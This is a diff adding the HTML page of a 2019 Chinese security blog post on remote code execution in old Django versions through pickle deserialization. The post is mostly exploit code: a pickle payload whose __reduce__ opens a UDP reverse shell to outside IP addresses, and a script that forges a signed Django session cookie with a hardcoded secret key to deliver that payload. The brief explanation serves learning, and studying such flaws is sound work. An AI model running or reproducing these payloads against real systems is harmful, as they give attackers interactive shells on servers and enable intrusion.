@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="Django低版本Rce"/>
+
+
+
+
+  <meta name="keywords" content="难度简单的Python," />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="RuoWeber">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="http://yoursite.com/2019/09/08/Django低版本Rce/"/>
+
+
+<meta name="description" content="漏洞原因及版本漏洞产生是因为django&amp;lt;1.5(?)时，采用的(反)序列化的方法是c中的pickle，因而可能产生rce，">
+<meta name="keywords" content="难度简单的Python">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Django低版本Rce">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;09&#x2F;08&#x2F;Django%E4%BD%8E%E7%89%88%E6%9C%ACRce&#x2F;index.html">
+<meta property="og:site_name" content="RuoWeber">
+<meta property="og:description" content="漏洞原因及版本漏洞产生是因为django&amp;lt;1.5(?)时，采用的(反)序列化的方法是c中的pickle，因而可能产生rce，">
+<meta property="og:locale" content="zh">
+<meta property="og:updated_time" content="2019-09-08T09:34:00.000Z">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+
+    <title> Django低版本Rce - RuoWeber </title>
+  </head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">RuoWeber</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          Django低版本Rce
+        
+      </h1>
+
+      <time class="post-time">
+          Sep 08 2019
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <h1 id="漏洞原因及版本"><a href="#漏洞原因及版本" class="headerlink" title="漏洞原因及版本"></a>漏洞原因及版本</h1><p>漏洞产生是因为django&lt;1.5(?)时，采用的(反)序列化的方法是c中的pickle，因而可能产生rce，</p>
+<a id="more"></a>
+
+<h2 id="举例展示pickle序列化时的漏洞"><a href="#举例展示pickle序列化时的漏洞" class="headerlink" title="举例展示pickle序列化时的漏洞"></a>举例展示pickle序列化时的漏洞</h2><p>如serialize.py</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line"></span><br><span class="line">​    import cPickle as pickle</span><br><span class="line"></span><br><span class="line">except:</span><br><span class="line"></span><br><span class="line">​    import pickle</span><br><span class="line"></span><br><span class="line">class id(object):</span><br><span class="line"></span><br><span class="line">​    def __reduce__(self):</span><br><span class="line"></span><br><span class="line">​        import subprocess</span><br><span class="line"></span><br><span class="line">​        return (subprocess.call,</span><br><span class="line"></span><br><span class="line">​                ([&apos;python&apos;,</span><br><span class="line"></span><br><span class="line">​                  &apos;-c&apos;,</span><br><span class="line"></span><br><span class="line">​                  &apos;import socket,subprocess,os;&apos;</span><br><span class="line"></span><br><span class="line">​                  &apos;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);&apos;</span><br><span class="line"></span><br><span class="line">​                  &apos;s.connect((&quot;62.234.128.237&quot;,7777));&apos;</span><br><span class="line"></span><br><span class="line">​                  &apos;os.dup2(s.fileno(),0);&apos;</span><br><span class="line"></span><br><span class="line">​                  &apos;os.dup2(s.fileno(),1);&apos;</span><br><span class="line"></span><br><span class="line">​                  &apos;os.dup2(s.fileno(),2);&apos;</span><br><span class="line"></span><br><span class="line">​                  &apos;subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;],))</span><br><span class="line"></span><br><span class="line">sess=base64.b64encode(pickle.dumps(id()))</span><br><span class="line"></span><br><span class="line">print sess</span><br></pre></td></tr></table></figure>
+
+<p>unserialize.py</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line"></span><br><span class="line">​    import cPickle as pickle</span><br><span class="line"></span><br><span class="line">except:</span><br><span class="line"></span><br><span class="line">​    import pickle</span><br><span class="line"></span><br><span class="line">pickle.loads(base64.b64decode(sys.argv[1]))</span><br></pre></td></tr></table></figure>
+
+<p>serialize.py的结果用unserialize.py去反序列化时会执行__reduce__方法的内容（这里时反弹udp的shell）</p>
+<h2 id="django中使用"><a href="#django中使用" class="headerlink" title="django中使用"></a>django中使用</h2><p>django中使用只需要知道两点</p>
+<p>1.secret_key</p>
+<p>2.能够控制session等使用secret_key序列化加密的东西（比如session存储在客户端cookie时）</p>
+<p>由于django没有深入学习过，先po到这里一个exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"># coding: utf-8</span><br><span class="line"></span><br><span class="line">from django.contrib.sessions.serializers import PickleSerializer</span><br><span class="line"></span><br><span class="line">from django.core import signing</span><br><span class="line"></span><br><span class="line">from django.conf import settings</span><br><span class="line"></span><br><span class="line">settings.configure(SECRET_KEY=&apos;oa4$kkk802=rfm@tl^e5yb3qvs_ea3r!m*&amp;j+#_+s-9=xcieci&apos;)</span><br><span class="line"></span><br><span class="line">class GetShellWithPython(object):</span><br><span class="line"></span><br><span class="line">​    def __reduce__(self):</span><br><span class="line"></span><br><span class="line">​        import subprocess</span><br><span class="line"></span><br><span class="line">​        return (subprocess.call,</span><br><span class="line"></span><br><span class="line">​                ([&apos;python&apos;,</span><br><span class="line"></span><br><span class="line">​                  &apos;-c&apos;,</span><br><span class="line"></span><br><span class="line">​                  &apos;import socket,subprocess,os;&apos;</span><br><span class="line"></span><br><span class="line">​                  &apos;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);&apos;</span><br><span class="line"></span><br><span class="line">​                  &apos;s.connect((&quot;95.179.179.3&quot;,7777));&apos;</span><br><span class="line"></span><br><span class="line">​                  &apos;os.dup2(s.fileno(),0);&apos;</span><br><span class="line"></span><br><span class="line">​                  &apos;os.dup2(s.fileno(),1);&apos;</span><br><span class="line"></span><br><span class="line">​                  &apos;os.dup2(s.fileno(),2);&apos;</span><br><span class="line"></span><br><span class="line">​                  &apos;subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;],))</span><br><span class="line"></span><br><span class="line">sess = signing.dumps(</span><br><span class="line"></span><br><span class="line">​    obj=GetShellWithPython(),</span><br><span class="line"></span><br><span class="line">​    serializer=PickleSerializer,</span><br><span class="line"></span><br><span class="line">​    salt=&apos;django.contrib.sessions.backends.signed_cookies&apos;</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">print(sess)</span><br></pre></td></tr></table></figure>
+
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+		
+		<div class="post-tags">
+		  
+			<a href="/tags/%E9%9A%BE%E5%BA%A6%E7%AE%80%E5%8D%95%E7%9A%84Python/">难度简单的Python</a>
+		  
+		</div>
+		
+
+        
+        
+  <nav class="post-nav">
+    
+      <a class="prev" href="/2019/09/08/FlaskJinja2SSTI/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">FlaskJinja2SSTI</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    
+    
+      <a class="next" href="/2019/09/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8/">
+        <span class="next-text nav-default">文件包含漏洞的利用</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon"><span class="copyright-year">
+    
+        &copy;
+    
+        2014 -
+    
+    2020
+    <span class="footer-author">asy.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
